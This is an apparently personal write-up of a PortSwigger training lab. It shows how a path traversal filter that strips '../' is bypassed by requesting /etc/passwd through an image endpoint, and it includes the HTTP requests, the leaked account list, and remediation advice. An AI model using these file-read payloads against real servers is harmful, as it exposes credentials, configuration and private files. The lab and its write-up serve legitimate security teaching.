# Traversal sequences blocked with absolute path bypass

**Category:** Path traversal
**Level:** Practitioner
**Mechanism:** Absolute path bypass
**Lab URL:** https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass

---

## Vulnerability

Path traversal lets an attacker read files outside the intended directory. Here
the image endpoint takes a user-controlled `filename` and uses it directly as a
filesystem path. Unlike the simple case, this lab adds a filter that strips `../`
sequences from the input — but the filter is incomplete, because stripping `../`
does nothing to stop an absolute path.

## Reconnaissance & Exploitation

The product images load through `GET /image?filename=<name>` (seen in the catalog
HTML, e.g. `<img src="/image?filename=2.jpg">`). That is the classic path traversal
sink, so I first tried the relative traversal from the previous lab:

```http
GET /image?filename=../../etc/passwd HTTP/2
Host: 0ab6003d046205eb825192410085001e.web-security-academy.net
```

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
Content-Length: 14

"No such file"
```

The `400 "No such file"` is the tell. It is not a "forbidden" or "invalid input"
error — the server actually went looking for a file and did not find one. That
means the filter **strips** the `../` sequences rather than rejecting the request:
`../../etc/passwd` becomes `etc/passwd`, which does not exist inside the image
directory. The defence removes the traversal instead of blocking it.

Since `../` is stripped, I dropped it entirely and requested the file by its
absolute path:

```http
GET /image?filename=/etc/passwd HTTP/2
Host: 0ab6003d046205eb825192410085001e.web-security-academy.net
```

```http
HTTP/2 200 OK
Content-Type: image/jpeg
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
...
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
```

Lab solved. This works because the application does not require the path to stay
relative to the image directory, so a path starting at `/` is read directly — no
`../` is needed, and there is nothing for the filter to strip.

## Impact

Arbitrary file read with the privileges of the web process — same end result as
the simple case (local account enumeration via `/etc/passwd`, and the ability to
read application source, config files, secrets and private keys).

The point specific to this lab is that a defence **was** in place and still failed.
Stripping `../` looks like it addresses path traversal, but it only blocks one
expression of the attack; the underlying flaw — trusting a user-supplied path — is
untouched. A control that reduces the obvious payloads while leaving the root cause
in place gives a false sense of security and is exactly the kind of partial fix an
attacker probes for.

## Remediation

- The `../` blacklist is the wrong model: it enumerates bad input instead of
  defining good input, so it misses the absolute path here (and encoding /
  non-recursive stripping in later labs).
- Validate the destination, not the pattern: resolve the full path (e.g. `realpath`)
  and confirm the result is still inside the intended base directory. This rejects
  both `../../etc/passwd` and `/etc/passwd`, because neither resolves inside the
  image folder.
- Best option: do not put user input into a filesystem path at all. Map an opaque
  identifier to a known file server-side, or serve images from object storage by key.

## References

- **OWASP:** A01:2021 Broken Access Control
- **CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)

## Notes

- Read the error, not just the status code: `400 "No such file"` revealed *how* the
  filter works (strip, then open) and pointed straight to the bypass. A generic
  "invalid request" would have hidden that.
- Key lesson carried into the next labs: blacklisting a pattern is not validating a
  destination. The same stripping filter falls to other tricks (non-recursive
  stripping, encoding) covered next.